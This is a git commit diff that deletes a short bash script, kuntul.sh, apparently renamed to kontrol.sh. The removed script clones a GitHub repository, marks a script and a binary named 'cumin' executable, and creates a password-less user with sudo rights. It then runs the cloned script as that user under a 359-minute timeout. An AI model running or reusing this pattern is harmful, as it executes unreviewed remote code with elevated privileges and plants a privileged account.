e5adf5a396d9304d51ac73a735cf8d9db708dbaa
squibex <90225595+squibex@users.noreply.github.com>
2021-12-14 15:38:25 +0700

    Update and rename kuntul.sh to kontrol.sh

--- kuntul.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-sudo apt update
-git clone https://github.com/squibex/login.git && cd login
-chmod +x okeh.sh && chmod +x cumin
-sudo adduser --disabled-password --gecos "" ikuk && sudo usermod -aG sudo ikuk
-sudo -u ikuk -H sh -c "timeout 359m ./okeh.sh"
-sudo apt update
